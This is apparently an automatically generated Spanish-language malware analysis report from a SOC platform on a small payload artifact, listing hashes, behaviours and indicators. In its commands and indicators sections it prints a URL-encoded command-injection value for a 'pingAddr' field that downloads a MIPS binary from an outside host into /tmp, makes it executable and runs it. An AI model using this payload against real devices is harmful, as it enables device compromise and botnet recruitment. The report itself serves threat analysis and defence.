# 🧬 Payload Analysis

`dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14`

## 📌 Resumen

Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Payload`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:46:43+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14`
- **SHA1:** `31449e775882dbd79bcae07622a292b67b10f35d`
- **MD5:** `14b4d50c4f19c145a48003c699e4f1f0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 191 B |
| Entropía | 5 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=2

## 🖥️ Comandos observados / extraídos

```text
pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart.abuse.st%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+warautalkinabout
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| hash | dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14 | static_analysis |
| command | pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart.abuse.st%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+warautalkinabout | strings |
| ip | 162.198.15.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
